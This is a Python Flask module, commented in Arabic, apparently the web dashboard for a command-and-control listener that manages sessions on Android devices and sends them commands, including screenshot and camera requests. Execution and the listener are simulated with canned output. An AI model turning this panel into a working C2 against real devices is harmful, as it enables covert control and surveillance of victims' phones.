#!/usr/bin/env python3
"""
Web Interface for C2 Listener - واجهة ويب متكاملة
"""

from flask import Blueprint, render_template, jsonify, request, Response
import json
import threading
from datetime import datetime
from pathlib import Path

# Create Blueprint
c2_web = Blueprint('c2_web', __name__, 
                   template_folder='templates',
                   static_folder='static')

# Store active sessions (in production use database)
active_sessions = {}
command_history = {}
session_lock = threading.Lock()

# WebSocket simulation (real implementation would use Flask-SocketIO)
websocket_clients = []

@c2_web.route('/')
def dashboard():
    """لوحة تحكم C2 الرئيسية"""
    return render_template('c2_dashboard.html')

@c2_web.route('/api/sessions')
def get_sessions():
    """الحصول على جميع الجلسات"""
    with session_lock:
        sessions_list = []
        for session_id, session in active_sessions.items():
            sessions_list.append({
                'id': session_id,
                'ip': session.get('ip', 'Unknown'),
                'port': session.get('port', 0),
                'device_info': session.get('device_info', {}),
                'connected_at': session.get('connected_at'),
                'last_seen': session.get('last_seen'),
                'status': session.get('status', 'inactive'),
                'commands_executed': len(command_history.get(session_id, []))
            })
        
        return jsonify({
            'success': True,
            'sessions': sessions_list,
            'count': len(sessions_list)
        })

@c2_web.route('/api/session/<session_id>')
def get_session(session_id):
    """الحصول على جلسة محددة"""
    with session_lock:
        session = active_sessions.get(session_id)
        if session:
            return jsonify({
                'success': True,
                'session': {
                    **session,
                    'command_history': command_history.get(session_id, [])[-20:]  # آخر 20 أمر
                }
            })
        return jsonify({'success': False, 'error': 'Session not found'})

@c2_web.route('/api/session/<session_id>/command', methods=['POST'])
def send_command(session_id):
    """إرسال أمر لجلسة"""
    data = request.json
    command = data.get('command', '').strip()
    
    if not command:
        return jsonify({'success': False, 'error': 'No command provided'})
    
    with session_lock:
        if session_id not in active_sessions:
            return jsonify({'success': False, 'error': 'Session not found'})
        
        # تحديث آخر رؤية
        active_sessions[session_id]['last_seen'] = datetime.now().isoformat()
        
        # حفظ في التاريخ
        if session_id not in command_history:
            command_history[session_id] = []
        
        command_entry = {
            'timestamp': datetime.now().isoformat(),
            'command': command,
            'session_id': session_id,
            'executed_by': request.remote_addr
        }
        
        command_history[session_id].append(command_entry)
        
        # محاكاة نتيجة التنفيذ
        result = simulate_command_execution(command)
        
        # إشعار WebSocket clients
        notify_websocket_clients({
            'type': 'command_executed',
            'session_id': session_id,
            'command': command,
            'result': result[:200],  # تقصير النتيجة
            'timestamp': datetime.now().isoformat()
        })
        
        return jsonify({
            'success': True,
            'command': command,
            'result': result,
            'timestamp': datetime.now().isoformat()
        })

@c2_web.route('/api/session/<session_id>/close', methods=['POST'])
def close_session(session_id):
    """إغلاق جلسة"""
    with session_lock:
        if session_id in active_sessions:
            active_sessions[session_id]['status'] = 'closed'
            active_sessions[session_id]['closed_at'] = datetime.now().isoformat()
            
            # إشعار WebSocket clients
            notify_websocket_clients({
                'type': 'session_closed',
                'session_id': session_id,
                'timestamp': datetime.now().isoformat()
            })
            
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': 'Session not found'})

@c2_web.route('/api/stats')
def get_stats():
    """الحصول على إحصائيات"""
    with session_lock:
        total_sessions = len(active_sessions)
        active_sessions_count = len([s for s in active_sessions.values() 
                                    if s.get('status') == 'active'])
        
        total_commands = sum(len(cmds) for cmds in command_history.values())
        
        return jsonify({
            'success': True,
            'stats': {
                'total_sessions': total_sessions,
                'active_sessions': active_sessions_count,
                'inactive_sessions': total_sessions - active_sessions_count,
                'total_commands': total_commands,
                'unique_ips': len(set(s.get('ip', '') for s in active_sessions.values()))
            }
        })

@c2_web.route('/api/c2/start', methods=['POST'])
def start_c2():
    """بدء C2 Listener"""
    # في التنفيذ الحقيقي، نبدأ الـ Listener الفعلي
    return jsonify({
        'success': True,
        'message': 'C2 Listener started on port 4444',
        'port': 4444
    })

@c2_web.route('/api/c2/stop', methods=['POST'])
def stop_c2():
    """إيقاف C2 Listener"""
    return jsonify({
        'success': True,
        'message': 'C2 Listener stopped'
    })

@c2_web.route('/api/c2/status')
def c2_status():
    """حالة C2 Listener"""
    return jsonify({
        'success': True,
        'running': True,  # محاكاة
        'port': 4444,
        'started_at': datetime.now().isoformat()
    })

# WebSocket endpoints
@c2_web.route('/ws')
def websocket():
    """WebSocket endpoint (SSE simulation)"""
    def event_stream():
        yield f"data: {json.dumps({'type': 'connected', 'message': 'WebSocket connected'})}\n\n"
        
        # إبقاء الاتصال مفتوحاً
        while True:
            import time
            time.sleep(30)
            yield f"data: {json.dumps({'type': 'ping', 'timestamp': datetime.now().isoformat()})}\n\n"
    
    return Response(event_stream(), mimetype="text/event-stream")

# Helper functions
def register_session(session_id, ip_address, port=4444, device_info=None):
    """تسجيل جلسة جديدة"""
    with session_lock:
        session_data = {
            'id': session_id,
            'ip': ip_address,
            'port': port,
            'device_info': device_info or {},
            'status': 'active',
            'connected_at': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat()
        }
        
        active_sessions[session_id] = session_data
        
        # إشعار WebSocket clients
        notify_websocket_clients({
            'type': 'session_connected',
            'session_id': session_id,
            'ip': ip_address,
            'timestamp': datetime.now().isoformat()
        })
        
        return session_data

def simulate_command_execution(command):
    """محاكاة تنفيذ أمر"""
    command_lower = command.lower()
    
    if command_lower == 'whoami':
        return "shell\n"
    elif command_lower == 'pwd':
        return "/data/data/com.example.app\n"
    elif command_lower.startswith('ls'):
        return "Android\nDCIM\nDownload\nPictures\n"
    elif command_lower == 'ifconfig' or command_lower == 'ip addr':
        return "wlan0: inet 192.168.1.5\nlo: inet 127.0.0.1\n"
    elif command_lower == 'getprop':
        return "[ro.build.version.sdk]: [29]\n[ro.product.model]: [Android SDK built for x86]\n"
    elif command_lower == 'ps':
        return "USER     PID   PPID  VSIZE  RSS   WCHAN    PC        NAME\nshell    1234  1     10000  2000  ffffffff 00000000 /system/bin/sh\n"
    elif command_lower == 'id':
        return "uid=0(root) gid=0(root)\n"
    elif 'screenshot' in command_lower:
        return "[*] Screenshot saved to /sdcard/screenshot.png\n"
    elif 'camera' in command_lower:
        return "[*] Camera access granted\n"
    else:
        return f"Command executed: {command}\nExit code: 0\n"

def notify_websocket_clients(data):
    """إشعار عملاء WebSocket"""
    # في التنفيذ الحقيقي، نرسل للـ WebSocket clients
    pass

# Create static files directory
static_dir = Path(__file__).parent / 'static'
static_dir.mkdir(exist_ok=True)

# Create sample data on startup
def init_sample_data():
    """تهيئة بيانات نموذجية للعرض"""
    sample_sessions = [
        ('sess-1234abcd', '192.168.1.100', 4444),
        ('sess-5678efgh', '10.0.0.15', 5555),
        ('sess-9012ijkl', '172.16.0.20', 6666)
    ]
    
    for session_id, ip, port in sample_sessions:
        register_session(session_id, ip, port, {
            'device': 'Android Emulator',
            'model': 'Android SDK built for x86',
            'android_version': '10',
            'sdk_version': '29'
        })
        
        # إضافة بعض الأوامر النموذجية
        if session_id not in command_history:
            command_history[session_id] = []
        
        sample_commands = ['whoami', 'pwd', 'ls -la', 'getprop']
        for cmd in sample_commands:
            command_history[session_id].append({
                'timestamp': datetime.now().isoformat(),
                'command': cmd,
                'session_id': session_id,
                'executed_by': 'system'
            })

# تهيئة البيانات النموذجية عند الاستيراد
init_sample_data()

if __name__ == "__main__":
    print("C2 Web Interface Module")
    print("Available endpoints:")
    print("  /              - Dashboard")
    print("  /api/sessions  - Get all sessions")
    print("  /api/stats     - Get statistics")
    print("  /ws            - WebSocket/SSE stream")